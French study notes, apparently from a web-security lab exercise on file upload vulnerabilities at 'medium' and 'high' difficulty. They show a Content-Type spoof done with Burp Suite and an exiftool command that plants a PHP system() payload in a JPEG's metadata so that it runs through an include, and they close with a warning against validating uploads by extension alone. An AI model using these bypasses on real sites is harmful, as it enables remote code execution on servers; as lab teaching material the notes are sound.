# medium

1. créer un nouveau fichier php 

```php
<?php 
// 02-fichier.php
echo "Medium hello" ; 
```

2. essayer de télécharger un fichier php ( xxxx ) utiliser Burp Suite 



Content-Type: application/octet-stream
Content-Type: image/jpeg

pour faire des requete http 

- javascript 
    - jQuery
- Python
    - requests
- PHP
    - curl()
- ligne de commande 
    - curl 
- Postman    

# High 

empoisonner un fichier image 

dans un fichier jpg 
image ET tableau qui contient des méta données

nom de l'auteur
la date de création
lat / longitude 

```sh
exiftool -DocumentName="<?php system('dir'); __halt_compiler() ;?>" img.jpg
```

une fois que le fichier est uploader => `include` dans 


getimagesize( $uploaded_tmp )

Attention ne pas prendre l'extension comme seul critère pour vérifier si le fichier est une image 

